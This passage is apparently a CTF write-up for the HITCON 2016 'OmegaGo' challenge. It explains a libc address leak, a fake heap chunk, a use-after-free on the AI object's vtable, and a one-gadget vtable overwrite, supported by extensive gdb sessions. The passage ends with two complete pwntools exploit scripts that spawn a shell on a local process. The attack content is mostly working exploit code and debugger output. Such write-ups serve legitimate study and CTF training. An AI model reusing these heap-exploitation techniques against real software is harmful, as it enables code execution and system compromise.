libcBaseAddresss = libcAddresss - 0x3c4b78
execve_bash = libcBaseAddresss + 0xF1117 

log.info('Libc Addresss : ' + hex(libcAddresss))
log.info('Libc Base Addresss : ' + hex(libcBaseAddresss))
log.info('execve bash Addresss : ' + hex(execve_bash))

p.interactive()
```

#### **Create a UAF vulnerability(Fake chunk)**

* **The previously described vulnerabilities can be used to create UAF vulnerabilities.**
  + The attack target is the vtable of AI Class.
  + The OmegaGo() function is requesting 8 bytes as the vtable space of AI Class.
    - The size of the corresponding chunk will be 0x20.
    - Chunk header(0x10) + Base heap area(0x10)
  + In other words, a fake chunk of 0x20 bytes is required to create a UAF vulnerability.

```sh title="Find the vtable"
...
  AI = (Method *)operator new(8uLL);
  AI->Play = 0LL;
  setAIFunction(AI);
  player[0] = AI;
  HUMAN = (Method *)operator new(8uLL);
  HUMAN->Play = 0LL;
  setHUMANFunction(HUMAN);
...
```

* **Fake chunks can be created with the following structure.**
  + Fake chunk addresses that meet the conditions below are stored in the gHistory[365] area by exploiting the vulnerability of the binary.  
    - Fake chunk size is 0x20
    - There must be a value in the next chunk (next\_size) area of ​​the fake chunk.

**Fake chunk struct**

|  | 0x0 | 0x8 |
| --- | --- | --- |
| 0x00 | 0000000000000000 | 0000000000000000 |
| 0x10 | 0000000000000000 | **0000000000000020** |
| 0x20 | 0000000000000000 | 0000010000000000 |
| 0x30 | 0000000000000000 | **0000000000000020** |
| 0x40 | 0000000000000000 | 0000000000000000 |
| 0x50 | 0000000000000000 | **next\_size** |
| 0x60 | 0000000900000009 | 000000000000004F |
| 0x70 | 40665799D0203E64 | 4066800000000000 |
| 0x80 | 0000000000000000 | 0000000000000031 |

* **You can create a basic model of Fake chunk using the script below.**

```python title="Create a Fake chunk"
...

#Memory reconstruction
surrender()
surrender()
surrender()
surrender()
surrender()
surrender()
 
#Fill out to board
Fill('B','S',11)
for count in reversed(range(1,9)):
    Fill('A','S',count)
Fill('A','A',11)

#Fake Chunk
Play('D14')
Play('R8')

Fill('A','I',10)

p.interactive()
```

* **You can check the fake chunk as follows.**
  + By entering the location value 182, Heap addresses (0xac6010) were saved in the gPlayerGameInfo global variable.
  + Fakechunk is implemented in the heap area.

```sh title="Run script"
lazenca0x0@ubuntu:~/CTF/HITCON/OmegaGo$ python test.py 
[!] Could not find executable 'omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac' in $PATH, using './omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac' instead
[+] Starting local process './omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac': pid 7625
[*] Libc Addresss : 0x7ff0339f6b78
[*] Libc Base Addresss : 0x7ff033632000
[*] execve bash Addresss : 0x7ff0337186bd
[*] Switching to interactive mode
   ABCDEFGHIJKLMNOPQRS
19 ..O...XO.\x00XX.......
18 ...................
17 ...................
16 ...................
15 ...................
14 ...X...............
13 ...................
12 .O.................
11 XXXXXXXXXXXXXXXXXXX
10 XXXXXXXXXOOOOOOOOOO
 9 OOOOOOOOOOOOOOOOOOO
 8 .................X.
 7 ...................
 6 ...............O...
 5 ...................
 4 ...................
 3 ...................
 2 ...................
 1 ...................
Time remain: O: 180.00, X: 179.85

$
```

```sh title="Fake chunk"
lazenca0x0@ubuntu:~/CTF/HITCON/OmegaGo$ gdb -q -p 7625
Attaching to process 7625
Reading symbols from /home/lazenca0x0/CTF/HITCON/OmegaGo/omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac...(no debugging symbols found)...done.
Reading symbols from /usr/lib/x86_64-linux-gnu/libstdc++.so.6...(no debugging symbols found)...done.
Reading symbols from /lib/x86_64-linux-gnu/libgcc_s.so.1...(no debugging symbols found)...done.
Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/libc-2.23.so...done.
done.
Reading symbols from /lib/x86_64-linux-gnu/libm.so.6...Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/libm-2.23.so...done.
done.
Reading symbols from /lib64/ld-linux-x86-64.so.2...Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/ld-2.23.so...done.
done.
0x00007f25b8a7d230 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.

gdb-peda$ x/4gx 0x609FC0
0x609fc0:	0x0000000000ac6010	0x0000000000000000
0x609fd0:	0x0000000000000000	0x0000000000000020
gdb-peda$ x/20gx 0x0000000000ac6010
0xac6010:	0x0000000000000000	0x0000000000000000
0xac6020:	0x0000000000000000	0x0000000000000020
0xac6030:	0xaaaa000000001000	0x555555aaaaaaaaaa
0xac6040:	0x0000000155555555	0x0000000000000020
0xac6050:	0x0000000000001000	0x0000000000000000
0xac6060:	0x0000000000000000	0x0000000000000000
0xac6070:	0x0000000a00000009	0x500001000000004f
0xac6080:	0x40667febca5375c7	0x40667b29ac365450
0xac6090:	0x0000000000000000	0x000000000000df71
0xac60a0:	0x0000000000000000	0x0000000000000000
gdb-peda$ c
Continuing.
```

* **Heap addresses (0xac6010) stored in the gPlayerGameInfo global variable have been changed as follows.**
  + The bit areas of heap addresses that can be changed by position value are as follows.
    - 1010 1100 0110 0000 0001 0000
  + Change the values ​​as follows:
    - 1010 1100 0110 0010 1001 0000
    - Position values: D19, E19
  + The value stored in gPlayerGameInfo.board[0] was changed to 0xac6290 by the user-entered values ​​D19 and E19.
    - The 0xac6290 area is the GameInfo.board[9] area.

```sh title="Position value"
$ D19
   ABCDEFGHIJKLMNOPQRS
19 ..OX..OX.XXX.......

...

Time remain: O: 180.00, X: 154.17

$ E19
   ABCDEFGHIJKLMNOPQRS
19 ..OXX.OX.XXX.......

...
Time remain: O: 180.00, X: 151.96

$
```

```sh title="The value of "gPlayerGameInfo.board[0]" has been changed."
^C
Program received signal SIGINT, Interrupt.
0x00007f25b8a7d230 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
84	in ../sysdeps/unix/syscall-template.S
gdb-peda$ x/4gx 0x609FC0
0x609fc0:	0x0000000000ac6290	0x0000000000ac60d0
0x609fd0:	0x0000000000ac6190	0x0000000000ac6250
gdb-peda$ x/20gx 0x0000000000ac6290 - 0x10
0xac6280:	0x0000000155555555	0x0000000000000020
0xac6290:	0x0000000000001000	0x0000000000000000
0xac62a0:	0x0000000000000000	0x0000000000000400
0xac62b0:	0x0000000400000000	0x5000010000000058
0xac62c0:	0x40667febb1290256	0x4060b9413db7f173
0xac62d0:	0xb02c3b6be73a708c	0x0000000000000031
0xac62e0:	0xc6d1f75f00000000	0x0000000000abbc90
0xac62f0:	0x0000000000000000	0x0000000000000000
0xac6300:	0x6c0eb26d35c354ca	0x0000000000000091
0xac6310:	0x0000000000ac6290	0x0000000000ac60d0
gdb-peda$
```

* **AI's vtable space is allocated to the Fake chunk as follows.**
  + To check UAF, set a break point as follows.

```sh title="Set Breakpoint"
gdb-peda$ b *0x401761
Breakpoint 1 at 0x401761
gdb-peda$ c
Continuing.
```

* **If you type “surrender” and restart the game, the Heap area will change as follows.**
  + Fake chunks were added to fastbins due to changed heap addresses.
  + When you request a heap area to store AI's vtable, a fake chunk (0xac6290) registered in fastbins is allocated.
  + This may cause the information in board[] to be overwritten in the AI ​​vtable (0xac6290) area.

```sh title="After "surrender" and restart, the Heap area has been changed."
$ surrender
This AI is too strong, ah?
Play history? (y/n)
$ n
Play again? (y/n)
$ y
   ABCDEFGHIJKLMNOPQRS
19 ...................
18 ...................
17 ...................
16 ...................
15 ...................
14 ...................
13 ...................
12 ...................
11 ...................
10 .........O.........
 9 ...................
 8 ...................
 7 ...................
 6 ...................
 5 ...................
 4 ...................
 3 ...................
 2 ...................
 1 ...................
Time remain: O: 180.00, X: 180.00

$
```

```sh title="UAF(AI vtable)" 
Breakpoint 1, 0x0000000000401761 in ?? ()
gdb-peda$ p main_arena.fastbinsY 
$1 = {0xac6280, 0xab8a40, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
gdb-peda$ ni
0x0000000000401766 in ?? ()
gdb-peda$ i r rax
rax            0xac6290	0xac6290
gdb-peda$ p main_arena.fastbinsY 
$2 = {0x0, 0xab8a40, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
gdb-peda$ x/4gx 0xac6290
0xac6290:	0x0000000000000000	0x0000000000000000
0xac62a0:	0x0000000000000000	0x0000000000000400
gdb-peda$ c
Continuing.
^C
Program received signal SIGINT, Interrupt.
0x00007ff033729230 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
84	in ../sysdeps/unix/syscall-template.S
gdb-peda$ x/4gx 0xac6290
0xac6290:	0x0000000000405040	0x0000000000000000
0xac62a0:	0x0000000000000000	0x0000000000000400
gdb-peda$ x/gx 0x0000000000405040
0x405040:	0x000000000040290a
gdb-peda$ x/10i 0x000000000040290a
   0x40290a:	push   rbp
   0x40290b:	mov    rbp,rsp
   0x40290e:	sub    rsp,0x150
   0x402915:	mov    QWORD PTR [rbp-0x128],rdi
   0x40291c:	mov    QWORD PTR [rbp-0x130],rsi
   0x402923:	mov    DWORD PTR [rbp-0x134],edx
   0x402929:	mov    QWORD PTR [rbp-0x140],rcx
   0x402930:	mov    QWORD PTR [rbp-0x148],r8
   0x402937:	mov    rax,QWORD PTR fs:0x28
   0x402940:	mov    QWORD PTR [rbp-0x8],rax
gdb-peda$
```

* **Add code to the script as follows:**

```python title="Add script code"
#0xXXXX010 -> 0xxxxx290
Play('D19')
Play('E19')

surrender()
```

#### **Overwrite the vtable**

* **You can overwrite the AI ​​vtable like this:**
  + In the AI ​​vtable area, the address of the area where the address of the function to be called is stored is overwritten with GameInfo.board[9].
  + The address to save in that area is gCmd global variable + 4 (0x60943C + 0x4 = 0x609440).
* **You can use that information to generate the following location values:**
  + Position values: D14, E14, G14, R15, A5, Q6
  + 0x609440 was saved in the GameInfo.board[9] area.

```sh title="Overwrite the vtable"
Q6
   ABCDEFGHIJKLMNOPQRS
19 ...................
18 ...................
17 ...................
16 ...................
15 .................XO
14 ..OXX.X............
13 ...................
12 ...................
11 ...................
10 .........O.........
 9 ...................
 8 ...................
 7 ...................
 6 ............O.OOX..
 5 XO.................
 4 ...................
 3 ...................
 2 ...................
 1 ...................
Time remain: O: 180.00, X: 162.59

gdb-peda$ x/20gx 0x609FC0
0x609fc0:	0x0000000000000000	0x0000000000000000
0x609fd0:	0x1800000000000000	0x00000000000008a4
0x609fe0:	0x0000000000000000	0x0000010000000000
0x609ff0:	0x0000000000000000	0x0000000000000000
0x60a000:	0x0000000000609440	0x0000000000000000
0x60a010:	0x0000000000000000	0x0000000000000000
0x60a020:	0x0000000200000005	0x000000000000004f
0x60a030:	0x40667fffaa044ae6	0x406452c1871e6cd3
0x60a040:	0x0000000000000000	0x0000000000000000
0x60a050:	0x0000000000000000	0x0000000000000000
gdb-peda$
```

* **Add code to the script as follows:**

```python title="Overwrite the vtable"
#Fill out to board
Fill('B','S',11)
for count in reversed(range(1,9)):
    Fill('A','S',count)
Fill('A','A',11)

#vtable Overflow
Play('D14')
Play('E14')
Play('G14')
Play('R15')
Play('A5')
Play('Q6')

Fill('A','E',19) 
sleep(20)
Play('F19|'+p64(execve_bash))
```

* **You can check the changed vtable information as follows.**
  + The AI ​​vtable area is 0x1a37290, and the address of the gCmd global variable (+4) is stored in that area.
  + The address value of One gadget is stored in the gCmd global variable +4 (0x609440) area.
  + The address is stored in rax and called, and a shell is obtained.

```sh title="Get shell!"
lazenca0x0@ubuntu:~$ gdb -q -p 59695
Attaching to process 59695
Reading symbols from /home/lazenca0x0/CTF/HITCON/OmegaGo/omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac...(no debugging symbols found)...done.
Reading symbols from /usr/lib/x86_64-linux-gnu/libstdc++.so.6...(no debugging symbols found)...done.
Reading symbols from /lib/x86_64-linux-gnu/libgcc_s.so.1...(no debugging symbols found)...done.
Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/libc-2.23.so...done.
done.
Reading symbols from /lib/x86_64-linux-gnu/libm.so.6...Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/libm-2.23.so...done.
done.
Reading symbols from /lib64/ld-linux-x86-64.so.2...Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/ld-2.23.so...done.
done.

gdb-peda$ b *0x4017D0
Breakpoint 1 at 0x4017d0
gdb-peda$ c
Continuing.

Breakpoint 1, 0x00000000004017d0 in ?? ()
gdb-peda$ x/13i $rip
=> 0x4017d0:	mov    rax,QWORD PTR [rbp+rax*8-0x30]
   0x4017d5:	mov    rax,QWORD PTR [rax]
   0x4017d8:	mov    rax,QWORD PTR [rax]
   0x4017db:	mov    edx,DWORD PTR [rbp-0x5c]
   0x4017de:	sub    edx,0x1
   0x4017e1:	movsxd rdx,edx
   0x4017e4:	mov    rdi,QWORD PTR [rbp+rdx*8-0x30]
   0x4017e9:	lea    rsi,[rbp-0x60]
   0x4017ed:	lea    rcx,[rbp-0x64]
   0x4017f1:	mov    edx,DWORD PTR [rbp-0x5c]
   0x4017f4:	mov    r8,rsi
   0x4017f7:	mov    esi,0x609fc0
   0x4017fc:	call   rax
gdb-peda$ i r rax
rax            0x0	0x0
gdb-peda$ i r rbp
rbp            0x7ffdb99059e0	0x7ffdb99059e0
gdb-peda$ p/x 0x7ffdb99059e0 - 0x30
$1 = 0x7ffdb99059b0
gdb-peda$ x/gx 0x7ffdb99059b0
0x7ffdb99059b0:	0x0000000001a37290
gdb-peda$ x/gx 0x0000000001a37290
0x1a37290:	0x0000000000609440
gdb-peda$ x/gx 0x0000000000609440
0x609440:	0x00007f10d2973117
gdb-peda$ x/5i 0x00007f10d2973117
   0x7f10d2973117 <exec_comm+2263>:	mov    rax,QWORD PTR [rip+0x2d2d9a]        # 0x7f10d2c45eb8
   0x7f10d297311e <exec_comm+2270>:	lea    rsi,[rsp+0x70]
   0x7f10d2973123 <exec_comm+2275>:	lea    rdi,[rip+0x9bbed]        # 0x7f10d2a0ed17
   0x7f10d297312a <exec_comm+2282>:	mov    rdx,QWORD PTR [rax]
   0x7f10d297312d <exec_comm+2285>:	call   0x7f10d294e770 <execve>
gdb-peda$ b *0x4017fc
Breakpoint 2 at 0x4017fc
gdb-peda$ c
Continuing.

Breakpoint 2, 0x00000000004017fc in ?? ()
gdb-peda$ i r rax
rax            0x7f10d2973117	0x7f10d2973117
gdb-peda$ c
Continuing.
process 59695 is executing new program: /bin/dash
```

## **Exploit Code**

### Ubuntu 16.04.3 LTS

```python title="Exploit(Ubuntu 16.04.3 LTS).py"
from pwn import *
 
#context.log_level = 'debug'
 
col_list = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S']
 
p = process('omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac')

def Play(location):
    p.recvuntil('\n\n')
    p.sendline(location)
 
 
def readBoard():
    global board
    board = []
    p.recvline()
    for line in range(0,19):
    	p.recv(3)
        board.append(p.recvuntil('\n')[0:19])
 
def surrender():
    p.recvuntil('\n\n')
    p.sendline('surrender')
    p.recvuntil('Play history? (y/n)')
    p.sendline('n')
    p.recvuntil('Play again? (y/n)')
    p.sendline('y')
 
def Fill(colStart, colEnd, row):
    for colNum in range(col_list.index(colStart),col_list.index(colEnd)+1):
    	locate = str(col_list[colNum])
        locate += str(row)
        Play(locate)
 
def decode(offset):
    bit_offset = offset * 8
    data = ''.join(board)
    result = 0
    for i in xrange(32):
        states = '.OX\0'
        val = states.index(data[bit_offset + i])
        result |= val << (i * 2)
    return result
 
def LeakAddresss():
    readBoard()
    return decode(0)
 
def LeakLibcAddresss():
    readBoard()
    return decode(32)
  
#Memory reconstruction   
surrender()
 
#Fill out to board
Fill('B','S',11)
for count in reversed(range(1,9)):
    Fill('A','S',count)
Fill('A','A',11)
Fill('A','K',12)

#Leak LibcAddresss
p.recvuntil('\n\n')
p.sendline('D19')
p.recvuntil('\n\n')
p.sendline('regret')

libcAddresss = LeakLibcAddresss()
libcBaseAddresss = libcAddresss - 0x3c4b78
execve_bash = libcBaseAddresss + 0xF1117 

log.info('Libc Addresss : ' + hex(libcAddresss))
log.info('Libc Base Addresss : ' + hex(libcBaseAddresss))
log.info('execve bash Addresss : ' + hex(execve_bash))

#Memory reconstruction
surrender()
surrender()
surrender()
surrender()
surrender()
surrender()
 
#Fill out to board
Fill('B','S',11)
for count in reversed(range(1,9)):
    Fill('A','S',count)
Fill('A','A',11)

#Fake Chunk
Play('D14')
Play('R8')

Fill('A','I',10)

#0xXXXX010 -> 0xxxxx290
Play('D19')
Play('E19')

#UAF
surrender()

#Fill out to board
Fill('B','S',11)
for count in reversed(range(1,9)):
    Fill('A','S',count)
Fill('A','A',11)

#vtable Overflow
Play('D14')
Play('E14')
Play('G14')
Play('R15')
Play('A5')
Play('Q6')

Fill('A','E',19) 
Play('F19|'+p64(execve_bash))
 
p.interactive()
```

### CTF server

```python title="Exploit(CTF server).py"
from pwn import *
 
#context.log_level = 'debug'
 
col_list = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S']
 
p = process('omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac')
 
def Play(location):
    p.recvuntil('\n\n')
    p.sendline(location)
 
 
def readBoard():
    global board
    board = []
    p.recvline()
    for line in range(0,19):
    	p.recv(3)
        board.append(p.recvuntil('\n')[0:19])
 
def surrender():
    p.recvuntil('\n\n')
    p.sendline('surrender')
    p.recvuntil('Play history? (y/n)')
    p.sendline('n')
    p.recvuntil('Play again? (y/n)')
    p.sendline('y')
 
def Fill(colStart, colEnd, row):
    for colNum in range(col_list.index(colStart),col_list.index(colEnd)+1):
    	locate = str(col_list[colNum])
        locate += str(row)
        Play(locate)
 
def decode(offset):
    bit_offset = offset * 8
    data = ''.join(board)
    result = 0
    for i in xrange(32):
        states = '.OX\0'
        val = states.index(data[bit_offset + i])
        result |= val << (i * 2)
    return result
 
def LeakAddresss():
    readBoard()
    return decode(0)
 
def LeakLibcAddresss():
    readBoard()
    return decode(32)
  
#Memory reconstruction   
surrender()
surrender()
 
#Fill out to board
Fill('B','S',11)
for count in reversed(range(1,9)):
    Fill('A','S',count)
Fill('A','A',11)
Fill('A','K',12)
 
#Leak LibcAddresss
p.recvuntil('\n\n')
p.sendline('D19')
p.recvuntil('\n\n')
p.sendline('regret')

libcAddresss = LeakLibcAddresss()
libcBaseAddresss = libcAddresss - 0x3be7b8
execve_bash = libcBaseAddresss + 0xe66bd
 
log.info('Libc Addresss : ' + hex(libcAddresss))
log.info('Libc Base Addresss : ' + hex(libcBaseAddresss))
log.info('execve bash Addresss : ' + hex(execve_bash))

#Memory reconstruction
surrender()
surrender()
surrender()
 
#Fill out to board
Fill('B','S',11)
for count in reversed(range(1,9)):
    Fill('A','S',count)
Fill('A','A',11)
 
#Fake Chunk
Play('D14')
Play('R8')
 
#0xXXXX410 -> 0xxxxx550
Fill('A','I',10)
Play('P1')
Play('O1')

surrender()

#Fill out to board 
Fill('B','S',6)
for line in range(15,20):
    Fill('A','S',line)
Play('A6')
 
#vtable Overflow
Play('B7')
Play('S8')
Play('R8')
Play('C12')
Play('F12')
Play('M8')
 
for line in range(16,19):
    Fill('A','S',line)
 
Fill('A','E',15)
sleep(20) 
Play('F15|'+p64(execve_bash))
 
p.interactive()
```

## **Flag**

|  |  |
| --- | --- |
| Flag |  |

## **Related Site**

* <http://charo-it.hatenablog.jp/entry/2016/12/08/085226>
* <https://github.com/pwning/public-writeup/tree/master/hitcon2016/pwn350-omegago>